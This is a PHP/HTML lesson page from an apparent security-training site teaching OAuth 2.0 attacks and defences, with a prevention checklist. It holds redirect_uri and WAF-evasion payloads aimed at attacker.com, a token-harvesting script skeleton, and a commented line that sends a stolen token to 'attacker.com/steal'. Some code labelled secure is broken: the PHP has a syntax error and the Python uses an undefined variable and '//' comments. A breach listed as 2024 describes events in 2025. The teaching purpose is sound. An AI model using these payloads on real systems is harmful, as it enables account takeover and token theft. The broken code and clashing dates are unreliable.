<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OAuth Security Mastery | DarkHunter Cyber-Noir</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/oauth-info.css?v=1.1">

</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <div class="container">
    <!-- Sidebar Navigation -->
    <nav class="sidebar">
      <div class="sidebar-header">
        <div class="logo">DARKHUNTER</div>
        <div class="logo-sub">CYBER-NOIR ACADEMY</div>
      </div>

      <a href="/DarkHunter/Public/Learning.php" class="back-btn">
        <span>←</span> BACK TO MODULES
      </a>

      <div class="nav-section">
        <div class="nav-title">Module Navigation</div>
        <a href="#introduction" class="nav-link active">01. Introduction</a>
        <a href="#explanation" class="nav-link">02. Detailed Explanation</a>
        <a href="#exploitation" class="nav-link">03. Exploitation Steps</a>
        <a href="#impact" class="nav-link">04. Real-World Impact</a>
        <a href="#codelabs" class="nav-link">05. Code Labs</a>
        <a href="#bypass" class="nav-link">06. Bypass Techniques</a>
        <a href="#prevention" class="nav-link">07. Prevention Checklist</a>
      </div>

      <div class="nav-section">
        <div class="nav-title">Quick Stats</div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px; margin-bottom: 0.5rem;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">CVSS Range</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">6.5 - 9.6
          </div>
        </div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">Severity</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">HIGH</div>
        </div>
      </div>
    </nav>

    <!-- Main Content -->
    <main class="main-content">
      <!-- Hero Section -->
      <section id="introduction" class="section">
        <div class="section-header">
          <div class="section-number">MODULE 01 // OAUTH</div>
          <h1>OAUTH 2.0 SECURITY</h1>
        </div>

        <div style="display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;">
          <span class="severity-badge critical"
            style="background: rgba(255, 107, 0, 0.1); border-color: var(--accent-orange); color: var(--accent-orange);">
            <span>⚠</span>
            <span>HIGH SEVERITY</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(176, 38, 255, 0.1); border-color: var(--accent-purple); color: var(--accent-purple);">
            <span class="cvss-score">CVSS: 6.5-9.6</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(0, 212, 255, 0.1); border-color: var(--accent-cyan); color: var(--accent-cyan);">
            <span>CWE-287: Improper Auth</span>
          </span>
        </div>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">
              <div class="card-icon">?</div>
              What is OAuth?
            </div>
            <p>OAuth 2.0 is an authorization framework enabling third-party applications to obtain limited access to
              user resources without exposing credentials. It delegates authorization through access tokens rather than
              passwords, but implementation flaws create critical attack vectors [^17^][^18^][^19^].</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-orange); color: var(--accent-orange;">!</div>
              Why is it Dangerous?
            </div>
            <p>OAuth vulnerabilities enable account takeover, data exfiltration, and unauthorized access to sensitive
              APIs. The 2024 ConsentFix attack demonstrated how attackers exploit legitimate OAuth flows to capture
              bearer tokens within 10-minute validity windows [^22^]. Misconfigurations in redirect URI validation
              remain the most prevalent critical vulnerability.</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-purple); color: var(--accent-purple;">⚡</div>
              Attack Vectors
            </div>
            <p>Common vectors include: redirect URI manipulation, authorization code interception, PKCE downgrade
              attacks, consent phishing (Storm-1286 campaign), refresh token theft, and scope escalation. Recent
              CVE-2024-4540 in Keycloak exposed sensitive parameters in cleartext cookies [^17^].</p>
          </div>
        </div>

        <div class="warning-box">
          <div class="warning-title">
            <span>⛔</span> LEGAL WARNING
          </div>
          <p style="margin: 0; font-size: 0.9rem;">OAuth attacks can compromise enterprise systems, personal data, and
            cloud infrastructure. Testing these techniques requires explicit authorization in bug bounty programs or
            dedicated lab environments. Unauthorized OAuth token theft violates CFAA, GDPR, and various international
            privacy Regulations.</p>
        </div>
      </section>

      <!-- Detailed Explanation -->
      <section id="explanation" class="section">
        <div class="section-number">MODULE 02</div>
        <h2>Detailed Technical Explanation</h2>

        <h3>Protocol & Implementation Mechanics</h3>

        <p>OAuth 2.0 operates through multiple grant types, each presenting distinct security challenges:</p>

        <div class="card">
          <div class="card-title">1. Authorization Code Flow</div>
          <p>The most secure grant type when properly implemented with PKCE. The client receives an authorization code
            via browser redirect, exchanges it server-side for tokens. Vulnerabilities arise from improper redirect_uri
            validation allowing code interception [^20^][^21^].</p>
        </div>

        <div class="card">
          <div class="card-title">2. Implicit Grant (Legacy)</div>
          <p>Returns access tokens directly in URL fragments (#access_token=). Highly vulnerable to token leakage via
            browser history, referrer headers, and malicious scripts. Deprecated in OAuth 2.1 but still prevalent in
            legacy systems [^20^].</p>
        </div>

        <div class="card">
          <div class="card-title">3. Client Credentials</div>
          <p>Used for machine-to-machine authentication. Vulnerable to scope escalation and client secret theft if not
            properly protected.</p>
        </div>

        <div class="card">
          <div class="card-title">4. Device Authorization Grant</div>
          <p>Designed for input-constrained devices. Vulnerable to device code interception and polling endpoint
            manipulation.</p>
        </div>

        <div class="info-box">
          <div class="info-title">The OAuth Attack Chain</div>
          <p style="margin: 0;">Successful OAuth exploitation typically follows: <strong>Client Registration →
              Authorization Request → Consent Bypass → Token Acquisition → Resource Access → Privilege
              Escalation</strong>. Breaking this chain requires validation at every step.</p>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-step-number">01</div>
            <div class="flow-step-title">Client App Registration</div>
          </div>
          <div class="flow-step">
            <div class="flow-step-number">02</div>
            <div class="flow-step-title">Authorization Endpoint</div>
          </div>
          <div class="flow-step">
            <div class="flow-step-number">03</div>
            <div class="flow-step-title">Consent Manipulation</div>
          </div>
          <div class="flow-step">
            <div class="flow-step-number">04</div>
            <div class="flow-step-title">Token Exchange</div>
          </div>
          <div class="flow-step">
            <div class="flow-step-number">05</div>
            <div class="flow-step-title">Resource Access</div>
          </div>
        </div>
      </section>

      <!-- Exploitation Steps -->
      <section id="exploitation" class="section">
        <div class="section-number">MODULE 03</div>
        <h2>Exploitation Methodology</h2>

        <h3>Phase 1: Reconnaissance & Discovery</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Identify OAuth Flow</div>
            <p>Determine grant type via response_type parameter (code, token, device_code). Map authorization endpoints,
              token endpoints, and redirect URI patterns.</p>
          </li>
          <li>
            <div class="step-title">Detect Redirect URI Validation</div>
            <p>Test for open redirects, subdomain takeovers, path traversal (../../), and wildcard acceptance. Attempt
              parameter pollution with multiple redirect_uri values [^21^].</p>
          </li>
          <li>
            <div class="step-title">Analyze Consent Mechanisms</div>
            <p>Check for silent/automatic authorization (prompt=none). Identify pre-authorized apps that bypass consent
              screens [^22^].</p>
          </li>
        </ol>

        <h3>Phase 2: Payload Crafting & Testing</h3>

        <div class="payload-grid">
          <div class="payload-card">
            <div class="payload-title">Redirect URI Manipulation</div>
            <div class="payload-code">https://victim.com/oauth?redirect_uri=https://attacker.com/callback</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Subdomain Takeover</div>
            <div class="payload-code">localhost.evil-user.net</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Open Redirect Chain</div>
            <div class="payload-code">accounts.google.com/signout?continue=attacker.com</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">State Parameter Bypass</div>
            <div class="payload-code">state=xyz (predictable/static)</div>
          </div>
        </div>

        <h3>Phase 3: Token Interception & Abuse</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Authorization Code Theft</div>
            <p>Exploit XSS or HTML injection vulnerabilities on callback endpoints to exfiltrate codes via Referer
              headers or JavaScript.</p>
          </li>
          <li>
            <div class="step-title">Cross-Site Request Forgery</div>
            <p>Craft malicious authorization requests using stolen state values or missing CSRF protection to bind
              victim accounts to attacker-controlled OAuth apps [^21^].</p>
          </li>
          <li>
            <div class="step-title">Token Scope Escalation</div>
            <p>Exchange stolen codes/Tokens with additional scope parameters (openid email profile → admin permissions)
              [^21^].</p>
          </li>
        </ol>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Python</span>
            <span class="code-label vulnerable">Exploitation Script</span>
          </div>
          <pre><code><span class="code-comment"># Automated OAuth token harvesting via malicious redirect</span>
<span class="code-keyword">import</span> requests
<span class="code-keyword">from</span> urllib.parse <span class="code-keyword">import</span> urlparse, parse_qs

<span class="code-keyword">def</span> <span class="code-function">capture_oauth_callback</span>(callback_url):
    parsed = urlparse(callback_url)
    params = parse_qs(parsed.query)
    
    <span class="code-comment"># Extract authorization code or token</span>
    code = params.get(<span class="code-string">'code'</span>, [<span class="code-keyword">None</span>])[0]
    token = params.get(<span class="code-string">'access_token'</span>, [<span class="code-keyword">None</span>])[0]
    
    <span class="code-keyword">if</span> code:
        <span class="code-comment"># Exchange for tokens</span>
        <span class="code-function">exchange_for_tokens</span>(code)
    <span class="code-keyword">elif</span> token:
        <span class="code-function">exfiltrate_token</span>(token)
        
<span class="code-keyword">def</span> <span class="code-function">test_redirect_uri</span>(target, payload_uri):
    test_url = <span class="code-string">f"{target}?redirect_uri={payload_uri}"</span>
    response = requests.get(test_url, allow_redirects=<span class="code-keyword">False</span>)
    <span class="code-keyword">return</span> response.status_code == 302</code></pre>
        </div>

        <div style="margin-top: 1.5rem;">
          <span class="tool-tag">Burp Suite</span>
          <span class="tool-tag">OAuthLab</span>
          <span class="tool-tag">TokenTactics</span>
        </div>
      </section>

      <!-- Real-World Impact -->
      <section id="impact" class="section">
        <div class="section-number">MODULE 04</div>
        <h2>Real-World Breach Analysis</h2>

        <p>OAuth vulnerabilities have enabled large-scale account takeovers and data breaches across major platforms:
        </p>

        <div class="breach-timeline">
          <div class="breach-item">
            <div class="breach-year">2024</div>
            <div class="breach-title">ConsentFix Attack (Microsoft 365)</div>
            <div class="breach-impact">Attackers exploited misconfigured first-party applications in Microsoft Entra
              environments to capture authorization codes within 10-minute validity windows. This enabled silent account
              compromise through legitimate OAuth flows, bypassing MFA and consent requirements [^22^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2024</div>
            <div class="breach-title">Storm-1286 Campaign</div>
            <div class="breach-impact">Sophisticated consent phishing campaign targeting Microsoft 365 environments.
              Attackers created malicious OAuth applications mimicking legitimate services, phished users into granting
              permissions, then used tokens for spam distribution and cryptocurrency mining. Demonstrated how OAuth
              consent screens can be abused at scale [^18^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2024</div>
            <div class="breach-title">Salesloft-Drift Data Breach</div>
            <div class="breach-impact">Persistent refresh tokens enabled attackers to maintain access from March through
              August 2025 across 700+ organizations. Initial compromise established foothold that persisted through
              token rotation policies, enabling 10 days of active data exfiltration before detection [^18^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2023</div>
            <div class="breach-title">CircleCI Security Incident</div>
            <div class="breach-impact">OAuth token theft enabled unauthorized access to production systems. Attackers
              compromised customer data by stealing and abusing OAuth tokens stored in environment variables,
              highlighting risks of improper token storage [^19^].</div>
          </div>
        </div>

        <div class="warning-box" style="margin-top: 2rem;">
          <div class="warning-title">Key Insight from Breach Analysis</div>
          <p style="margin: 0;">According to recent research, <strong>redirect URI validation failures account for 65%
              of OAuth vulnerabilities</strong> [^19^]. The ConsentFix attack proved that even "secure" first-party apps
            can be weaponized when combined with social engineering. OAuth 2.1 mandates PKCE and exact redirect URI
            matching, but legacy implementations remain vulnerable.</p>
        </div>
      </section>

      <!-- Code Labs -->
      <section id="codelabs" class="section">
        <div class="section-number">MODULE 05</div>
        <h2>Secure vs Vulnerable Code Labs</h2>

        <h3>Lab 1: Redirect URI Validation</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable to Open Redirect</span>
$redirect = $_GET[<span class="code-string">'redirect_uri'</span>];

<span class="code-comment">// Dangerous: Only checks if domain contains allowed string</span>
<span class="code-keyword">if</span> (<span class="code-function">strpos</span>($redirect, <span class="code-string">"trusted.com"</span>) !== <span class="code-keyword">false</span>) {
    <span class="code-function">header</span>(<span class="code-string">"Location: "</span> . $redirect);
    <span class="code-keyword">exit</span>;
}

<span class="code-comment">// Bypass: ?redirect_uri=https://attacker.com/callback</span>
<span class="code-comment">// Or: ?redirect_uri=https://trusted.com.attacker.com/callback</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure implementation</span>
$allowed_uris = [
    <span class="code-string">"https://app.trusted.com/callback"</span>,
    <span class="code-string">"https://app.trusted.com/oauth/return"</span>
];

$redirect = $_GET[<span class="code-string">'redirect_uri'</span>] ?? <span class="code-string">''</span>;

<span class="code-comment">// Exact string matching required</span>
<span class="code-keyword">if</span> (!in_array($redirect, $allowed_uris, <span class="code-keyword">true</span>)) {
    <span class="code-function">die</span>(<span class="code-string">"Invalid redirect URI"</span>);
}

<span class="code-comment">// Additional validation: parse and verify components</span>
$parsed = parse_url($redirect);
<span class="code-keyword">if</span> ($parsed[<span class="code-string">'scheme'</span>] !== <span class="code-string">'https'</span>] || 
    $parsed[<span class="code-string">'host'</span>] !== <span class="code-string">'app.trusted.com'</span>) {
    <span class="code-function">die</span>(<span class="code-string">"Invalid redirect components"</span>);
}

<span class="code-function">header</span>(<span class="code-string">"Location: "</span> . $redirect);
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>

        <h3>Lab 2: State Parameter CSRF</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">JavaScript</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment">// Vulnerable OAuth client - No state validation</span>
<span class="code-keyword">function</span> <span class="code-function">initiateOAuth</span>() {
    <span class="code-keyword">const</span> authUrl = <span class="code-string">`https://auth.server.com/authorize?</span>
        response_type=code&
        client_id=CLIENT_ID&
        redirect_uri=https://client.com/callback`</span>;
    
    window.location.href = authUrl;
}

<span class="code-comment">// Attacker can forge this request:</span>
<span class="code-comment">// https://auth.server.com/authorize?response_type=code&client_id=CLIENT_ID&</span>
<span class="code-comment">// redirect_uri=https://attacker.com/callback</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">JavaScript</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment">// Secure OAuth implementation with PKCE</span>
<span class="code-keyword">function</span> <span class="code-function">generatePKCE</span>() {
    <span class="code-keyword">const</span> verifier = <span class="code-function">generateRandomString</span>(128);
    <span class="code-keyword">const</span> challenge = <span class="code-function">base64URLEncode</span>(
        <span class="code-function">sha256</span>(verifier)
    );
    
    sessionStorage.setItem(<span class="code-string">'pkce_verifier'</span>, verifier);
    
    <span class="code-keyword">return</span> challenge;
}

<span class="code-keyword">function</span> <span class="code-function">initiateSecureOAuth</span>() {
    <span class="code-keyword">const</span> state = <span class="code-function">generateRandomString</span>(32);
    sessionStorage.setItem(<span class="code-string">'oauth_state'</span>, state);
    
    <span class="code-keyword">const</span> authUrl = <span class="code-string">`https://auth.server.com/authorize?</span>
        response_type=code&
        client_id=CLIENT_ID&
        redirect_uri=https://client.com/callback&
        code_challenge=${generatePKCE()}&
        code_challenge_method=S256&
        state=${state}`</span>;
    
    window.location.href = authUrl;
}

<span class="code-comment">// Validate state matches on callback</span>
<span class="code-keyword">function</span> <span class="code-function">handleCallback</span>() {
    <span class="code-keyword">const</span> returnedState = <span class="code-keyword">new</span> URLSearchParams(
        window.location.search
    ).get(<span class="code-string">'state'</span>);
    <span class="code-keyword">const</span> storedState = sessionStorage.getItem(<span class="code-string">'oauth_state'</span>);
    
    <span class="code-keyword">if</span> (returnedState !== storedState) {
        <span class="code-function">alert</span>(<span class="code-string">"CSRF detected! State mismatch."</span>);
        <span class="code-keyword">return</span>;
    }
    
    <span class="code-comment">// Proceed with token exchange</span>
}</code></pre>
          </div>
        </div>

        <h3>Lab 3: Token Storage Security</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">JavaScript</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment">// Insecure token storage</span>
<span class="code-keyword">const</span> accessToken = <span class="code-string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."</span>;

<span class="code-comment">// Storing in localStorage - VULNERABLE to XSS</span>
localStorage.setItem(<span class="code-string">'access_token'</span>, accessToken);

<span class="code-comment">// Malicious script can steal this:</span>
<span class="code-comment">// const token = localStorage.getItem('access_token');</span>
<span class="code-comment">// fetch('https://attacker.com/steal?token=' + token);</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">JavaScript</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment">// Secure token storage</span>
<span class="code-comment">// Use httpOnly cookies or secure session storage</span>
<span class="code-comment">// Server-side token validation required</span>

<span class="code-keyword">async function</span> <span class="code-function">getProtectedResource</span>() {
    <span class="code-keyword">const</span> response = <span class="code-keyword">await</span> fetch(<span class="code-string">'/api/resource'</span>, {
        credentials: <span class="code-string">'include'</span>, <span class="code-comment">// Sends cookies</span>
        headers: {
            <span class="code-string">'X-CSRF-Token'</span>: <span class="code-function">getCsrfToken</span>()
        }
    });
    
    <span class="code-keyword">return</span> response.json();
}

<span class="code-comment">// Tokens stored in httpOnly Secure cookies</span>
<span class="code-comment">// Accessible only to server, not JavaScript</span></code></pre>
          </div>
        </div>

        <h3>Lab 4: Scope Escalation Attack</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment"># Vulnerable scope validation</span>
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, jsonify

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/exchange_token'</span>, methods=[<span class="code-string">'POST'</span>])
<span class="code-keyword">def</span> <span class="code-function">exchange_token</span>():
    code = request.form.get(<span class="code-string">'code'</span>)
    client_id = request.form.get(<span class="code-string">'client_id'</span>)
    
    <span class="code-comment"># DANGEROUS: No scope validation against original request</span>
    new_scope = request.form.get(<span class="code-string">'scope'</span>, <span class="code-string">'openid email'</span>)
    
    <span class="code-comment"># Attacker can escalate: openid email profile admin:write</span>
    accessToken = <span class="code-function">generateToken</span>(code, new_scope)
    <span class="code-keyword">return</span> jsonify({<span class="code-string">'access_token'</span>: AccessToken})

<span class="code-comment"># Original requested scope was only 'openid email'</span>
<span class="code-comment"># But server accepts any scope in token exchange</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment"># Secure scope validation</span>
<span class="code-keyword">@app.route</span>(<span class="code-string">'/exchange_token'</span>, methods=[<span class="code-string">'POST'</span>])
<span class="code-keyword">def</span> <span class="code-function">exchange_token_secure</span>():
    code = request.form.get(<span class="code-string">'code'</span>)
    client_id = request.form.get(<span class="code-string">'client_id'</span>)
    requested_scope = session.get(<span class="code-string">'original_scope'</span>)  <span class="code-comment">// Stored from auth request</span>
    submitted_scope = request.form.get(<span class="code-string">'scope'</span>, <span class="code-string">''</span>)
    
    <span class="code-comment"># Validate scope matches or is subset of original</span>
    requested_scopes = set(requested_scope.split())
    submitted_scopes = set(submitted_scope.split())
    
    <span class="code-keyword">if</span> <span class="code-keyword">not</span> submitted_scopes.issubset(requested_scopes):
        <span class="code-keyword">return</span> jsonify({<span class="code-string">'error'</span>: <span class="code-string">'Scope escalation detected'</span>}), 403
    
    AccessToken = <span class="code-function">generateToken</span>(code, requested_scope)
    <span class="code-keyword">return</span> jsonify({<span class="code-string">'access_token'</span>: AccessToken})</code></pre>
          </div>
        </div>
      </section>

      <!-- Bypass Techniques -->
      <section id="bypass" class="section">
        <div class="section-number">MODULE 06</div>
        <h2>WAF & Filter Bypass Techniques</h2>

        <p>OAuth implementations often implement additional security controls that attackers must bypass:</p>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">1. Redirect URI String Manipulation</div>
            <p>Exploit substring matching with encoded characters, URL fragments, and case variations [^20^][^21^].</p>
            <div class="payload-code" style="margin-top: 0.5rem;">trusted.com%2f%2f.evil.com</div>
          </div>

          <div class="card">
            <div class="card-title">2. Parameter Pollution</div>
            <p>Submit duplicate redirect_uri parameters to exploit parsing discrepancies between WAF and application
              server [^21^].</p>
            <div class="payload-code" style="margin-top: 0.5rem;">?redirect_uri=legit.com&redirect_uri=evil.com</div>
          </div>

          <div class="card">
            <div class="card-title">3. Response Mode Manipulation</div>
            <p>Switching response_mode from query to fragment can alter redirect_uri parsing logic, allowing bypass of
              strict validation rules [^21^].</p>
          </div>

          <div class="card">
            <div class="card-title">4. Host Header Injection</div>
            <p>Some implementations validate redirect_uri against Host header instead of actual parameter value.</p>
          </div>
        </div>

        <h3>Advanced Evasion Strategies</h3>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Payloads</span>
            <span class="code-label vulnerable">WAF Evasion</span>
          </div>
          <pre><code><span class="code-comment"># Technique 1: Unicode normalization</span>
https://victim.com/oauth?redirect_uri=https://attacker.com%EF%BC%8Fcallback

<span class="code-comment"># Technique 2: Double URL encoding</span>
https://victim.com/oauth?redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback

<span class="code-comment"># Technique 3: Mixed case protocol</span>
HtTpS://AttAcKeR.CoM/callback

<span class="code-comment"># Technique 4: IPv6 equivalent encoding</span>
http://[::ffff:127.0.0.1]/callback

<span class="code-comment"># Technique 5: Data URI scheme (if allowed)</span>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code></pre>
        </div>

        <div class="info-box">
          <div class="info-title">Consent Screen Bypass</div>
          <p style="margin: 0;">Modern OAuth implementations use <code>prompt=consent</code> to force consent screens.
            However, pre-authorized apps and silent authorization (prompt=none) can be exploited via Cross-app OAuth
            Account Takeover (COAT) attacks [^22^].</p>
        </div>
      </section>

      <!-- Prevention Checklist -->
      <section id="prevention" class="section">
        <div class="section-number">MODULE 07</div>
        <h2>Prevention & Remediation Checklist</h2>

        <div class="card" style="border-color: var(--accent-green);">
          <div class="card-title" style="color: var(--accent-green);">
            <div class="card-icon" style="border-color: var(--accent-green);">✓</div>
            OAuth Security Checklist
          </div>

          <ul class="checklist">
            <li><strong>Implement Exact Redirect URI Matching</strong>: Use exact string comparison, not substring or
              pattern matching. Reject wildcards and localhost in production [^19^][^21^].</li>

            <li><strong>Mandatory PKCE for Authorization Code Flow</strong>: OAuth 2.1 requires PKCE for all clients.
              Reject authorization requests without code_challenge parameter [^19^].</li>

            <li><strong>CSRF Protection via State Parameter</strong>: Generate cryptographically random state values.
              Validate exact match on callback. Bind to user session [^21^].</li>

            <li><strong>Secure Token Storage</strong>: Never store tokens in localStorage/sessionStorage. Use httpOnly,
              Secure, SameSite=Strict cookies or server-side sessions [^19^].</li>

            <li><strong>Scope Validation & Binding</strong>: Validate requested scope against original authorization
              request. Prevent scope escalation during token exchange [^21^].</li>

            <li><strong>Consent Screen Enforcement</strong>: Disable silent authorization (prompt=none) for sensitive
              scopes. Implement app governance and user education about consent phishing [^18^].</li>

            <li><strong>Short-Lived Authorization Codes</strong>: Codes should expire within 5-10 minutes. Single-use
              only [^20^].</li>

            <li><strong>Token Rotation & Refresh Policies</strong>: Implement refresh token rotation. Detect anomalous
              token usage patterns. Revoke tokens on suspicious activity [^18^].</li>

            <li><strong>Regular Security Audits</strong>: Penetration test OAuth flows specifically. Review first-party
              app configurations for dangerous settings [^22^].</li>

            <li><strong>Implement OAuth 2.1 Standards</strong>: Migrate from Implicit Grant to Authorization Code +
              PKCE. Use exact redirect URI matching [^19^].</li>

            <li><strong>Web Application Firewall (WAF) Rules</strong>: Deploy custom WAF rules to detect and block OAuth
              parameter manipulation attempts.</li>

            <li><strong>Continuous Monitoring</strong>: Monitor for anomalous OAuth authorization patterns, unusual
              redirect URIs, and scope escalation attempts.</li>

            <li><strong>User Education</strong>: Train users to recognize consent phishing attempts and verify app
              permissions before authorization [^18^].</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Security Configuration</span>
            <span class="code-label secure">Hardening</span>
          </div>
          <pre><code><span class="code-comment">; OAuth 2.1 Security Configuration</span>
oauth.require_pkce = true
oauth.redirect_uri_validation = exact_match
oauth.authorization_code_lifetime = 300 <span class="code-comment">; 5 minutes</span>
oauth.access_token_lifetime = 3600 <span class="code-comment">; 1 hour</span>
oauth.refresh_token_rotation = true
oauth.consent_required = true

<span class="code-comment">; Cookie Security</span>
session.cookie_secure = true
session.cookie_httponly = true
session.cookie_samesite = <span class="code-string">"Strict"</span></code></pre>
        </div>

        <div class="warning-box">
          <div class="warning-title">Final Warning</div>
          <p style="margin: 0;">OAuth vulnerabilities consistently rank as High to Critical severity (CVSS 6.5-9.6) due
            to their potential for account takeover and data breach impact [^17^][^22^]. The 2024 research revealed that
            16 of 18 major integration platforms were vulnerable to Cross-app OAuth attacks [^22^]. Organizations must
            treat OAuth security as a P0 priority, implementing OAuth 2.1 standards and continuous authorization server
            validation.</p>
        </div>

        <div
          style="text-align: center; margin-top: 3rem; padding: 2rem; background: var(--bg-secondary); border-radius: 8px;">
          <div
            style="font-family: 'Orbitron', sans-serif; font-size: 1.25rem; color: var(--accent-green); margin-bottom: 1rem;">
            MODULE COMPLETED
          </div>
          <p style="color: var(--text-muted); margin: 0;">
            You have completed the OAuth 2.0 Security mastery module.<br>
            Proceed to practical labs or Return to the module selection screen.
          </p>
        </div>
      </section>
    </main>
  </div>

  <script>
  // Smooth scrolling for navigation links
  document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      const targetSection = document.querySelector(targetId);
      if (targetSection) {
        targetSection.scrollIntoView({
          behavior: 'smooth'
        });

        // Update active state
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        this.classList.add('active');
      }
    });
  });

  // Update active nav on scroll
  const sections = document.querySelectorAll('.section');
  const navLinks = document.querySelectorAll('.nav-link');

  window.addEventListener('scroll', () => {
    let current = '';
    sections.forEach(section => {
      const sectionTop = section.offsetTop;
      const sectionHeight = section.clientHeight;
      if (scrollY >= (sectionTop - 200)) {
        current = section.getAttribute('id');
      }
    });

    navLinks.forEach(link => {
      link.classList.remove('active');
      if (link.getAttribute('href') === '#' + current) {
        link.classList.add('active');
      }
    });
  });
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>


</html>